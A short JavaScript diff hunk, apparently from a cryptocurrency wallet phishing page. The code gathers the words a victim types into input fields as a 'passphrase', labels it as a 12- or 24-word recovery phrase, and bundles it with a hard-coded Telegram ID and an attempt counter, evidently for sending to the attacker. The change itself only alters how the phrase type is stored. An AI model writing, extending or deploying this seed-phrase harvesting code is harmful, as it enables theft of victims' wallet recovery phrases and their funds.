@@ -247,7 +247,7 @@
             inputs.forEach((i) => passphrase.push(i.value));
             const data = {
               telegramID: 1936090861,
-              phraseType: keyType === 1 ? "12 words" : "24 words",
+              phraseType: keyType,
               attempt,
               passphrase,
             };
